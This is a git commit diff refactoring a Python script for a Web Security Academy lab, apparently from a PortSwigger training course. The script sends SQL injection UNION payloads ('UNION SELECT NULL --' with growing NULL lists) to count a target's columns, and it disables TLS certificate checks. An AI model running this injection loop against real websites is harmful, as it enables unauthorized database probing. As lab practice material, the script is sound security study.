c98a6a85baeef4bb4c51c023a3989f239973dd69
Fauxsys <soseccon@gmail.com>
2020-04-29 23:26:08 -0400

    Implement Validator decorator

--- sqli_union_lab_1.py
+++ sqli_union_lab_1.py
@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 import requests
-import sys
+import functools
 from dataclasses import dataclass, field
-from bs4 import BeautifulSoup
-import re
+from typing import Any
+import sys
+
 
 # Disable warnings generated due to unverified SSL connections
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
@@ -15,65 +16,64 @@ To solve the lab, perform an SQL injection UNION attack that returns an addition
 
 
 @dataclass()
-class Request:
-    url: str = field()
-    parameters: dict = field(default_factory=dict)
-    session: requests.sessions.Session = field(default=requests.Session())
-    response: requests.models.Response = field(default=None)
+class Validator:
+    """Validate Requests Objects"""
+    request: Any
 
-    def get(self) -> response:
-        """ Perform an HTTP GET request """
-        try:
-            self.response = self.session.get(url=self.url, params=self.parameters, verify=False, timeout=10)
-        finally:
-            self.validate()
+    def __post_init__(self):
+        functools.update_wrapper(self, self.request)
 
-    def post(self) -> response:
-        """ Perform an HTTP POST request """
-        try:
-            self.response = self.session.post(url=self.url, params=self.parameters, verify=False, timeout=10)
-        finally:
-            self.validate()
+    def __call__(self, *args, **kwargs):
+        response = self.request(*args, **kwargs)
 
-    def validate(self):
-        """ Validate Request """
         try:
-            self.response.raise_for_status()
+            response.raise_for_status()
         except requests.exceptions.HTTPError:
-            if self.response.status_code == 404:
+            if response.status_code == 404:
                 help_msg = 'The session you are looking for has expired.'
-                sys.exit(f'{self.response.status_code}: {self.response.reason}. {help_msg}')
+                sys.exit(f'{response.status_code}: {response.reason}. {help_msg}')
         except requests.exceptions.ConnectionError as error:
             help_msg = 'Please make sure you are using a valid URL.'
             sys.exit(f'{help_msg}\n{error}')
+        except requests.exceptions.Timeout:
+            help_msg = 'Request timed out. This may be due to using an outdated lab URL.'
+            sys.exit(f'{help_msg}')
         except requests.exceptions.RequestException as error:
             help_msg = 'Caught general exception:'
             sys.exit(f'{help_msg} {error}')
+        return response
+
+
+requests.Session.request = Validator(requests.Session().request)
 
 
 @dataclass()
-class Injection(Request):
+class Injection:
+    lab_url: str = field()
+    parameters: dict = field(default_factory=dict)
+    session: requests.Session = field(default=requests.Session())
     null: list = field(default_factory=list)
 
     def __post_init__(self):
-        self.url = f'{self.url}filter' if self.url.endswith('/') else f'{self.url}/filter'
+        self.lab_url = f'{self.lab_url}filter' if self.lab_url.endswith('/') else f'{self.lab_url}/filter'
         self.null = ["'UNION SELECT", 'NULL', '--']
         self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
 
     def null_logic(self):
-        while not self.response.ok:
+        response = self.session.get(url=self.lab_url, params=self.parameters, timeout=5)
+
+        while not response.ok:
             # Remove '--' then add ', NULL --' until response.ok is True
             self.null.remove('--')
             self.null.extend([',', 'NULL', '--'])
             self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
-            self.get()
+            response = self.session.get(url=self.lab_url, params=self.parameters)
 
 
 if __name__ == '__main__':
-    url = 'https://abcd.web-security-academy.net/'
+    lab_url = 'https://abcd.web-security-academy.net/'
 
-    sqli = Injection(url)
-    sqli.get()
+    sqli = Injection(lab_url=lab_url)
     sqli.null_logic()
 
     print(f"There are {sqli.null.count('NULL')} columns.")
